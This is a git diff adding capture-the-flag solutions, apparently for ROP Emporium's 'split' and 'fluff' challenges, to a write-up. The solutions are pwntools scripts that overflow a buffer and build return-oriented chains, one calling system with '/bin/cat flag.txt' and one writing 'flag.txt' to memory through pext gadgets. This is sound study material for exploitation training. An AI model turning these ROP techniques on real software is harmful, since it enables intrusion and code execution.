@@ -64,7 +64,16 @@ proc.interactive()
 
 ## split
 
-//TODO 
+```python
+rop.call(elf.symbols['system'], [next(elf.search(b'/bin/cat flag.txt'))])
+payload = fit({
+    cyclic_find('laaa'): rop.chain()
+})
+
+proc.sendlineafter('> ', payload)
+# shellit
+proc.interactive()
+```
 
 
 ## write4
@@ -190,4 +199,93 @@ payload = fit({
 proc.sendlineafter('> ', payload)
 # shellit
 proc.interactive()
+```
+
+
+## fluff
+
+```python
+'''
+TEMP ← SRC1;
+MASK ← SRC2;
+DEST ← 0 ;
+m← 0, k← 0;
+DO WHILE m< OperandSize
+    IF MASK[ m] = 1 THEN
+        DEST[ k] ← TEMP[ m];
+        k ← k+ 1;
+    FI
+    m ← m+ 1;
+OD
+'''
+def bruteforce_mask_value(mask, target_value):
+    """ 
+    create the stream of bytes that will produce
+    the target value when suppied as an operand to
+    the ptex instruction with the given mask
+    """
+    needed_bytes = []
+    
+    # logic from @cryptocat
+    for char in target_value:
+        mask_reversed = bits(mask, endian='little')
+        char_bits = bits(u8(char), endian='little')
+        
+        set_bits_count = 0
+        mask_offset = 0
+        set_bits = ''
+        
+        while set_bits_count < len(char_bits) - 1:
+            if (char_bits[set_bits_count] == mask_reversed[mask_offset]):
+                set_bits += '1'
+                set_bits_count += 1
+            else:
+                set_bits += '0'
+            mask_offset += 1
+        
+
+        set_bits += '0' * (16 - len(set_bits))
+        needed_bytes.append(''.join(reversed(set_bits)))
+
+    return [int(u16(unbits((bit)), endian='big')) for bit in needed_bytes]
+
+def main():
+    ## get da banner
+    log.info('Receiving banner ...')
+
+    # ::::::::::::::::::::::::::: setup :::::::::::::::::::::::::::
+    data_section = elf.symbols.data_start
+    log.success(f".data starts @{hex(data_section)}")
+    # :::::::::::::::::::::: resolve gadgets ::::::::::::::::::::::
+    pop_ebp = 0x080485bb            # pop ebp; ret
+    # mov eax, ebp; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
+    pext_edx = 0x08048543           # ^
+    binance_gadget = 0x08048555     # xchg   BYTE PTR [ecx],dl
+    pop_ecx_bswap = 0x08048558      # pop ecx ; bswap ecx ; ret
+    # ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+    mask_bytes = 0xb0bababa              # from questionableGadgets
+    target_str = "flag.txt"
+    target_bytes = bruteforce_mask_value(mask_bytes, target_str)
+    log.success(f"target bytes: {target_bytes}")
+
+    for offset, byte in enumerate(target_bytes):
+        rop.raw([
+            pop_ebp,
+            byte,
+            pext_edx,
+            pop_ecx_bswap,
+            pack(data_section + offset, endianness='big'),
+            binance_gadget
+        ])
+
+    rop.print_file(data_section)
+    
+    payload = flat({
+        cyclic_find('laaa'): rop.chain()
+    })
+
+    proc.sendlineafter('> ', payload)
+    # shellit
+    proc.interactive()
 ```
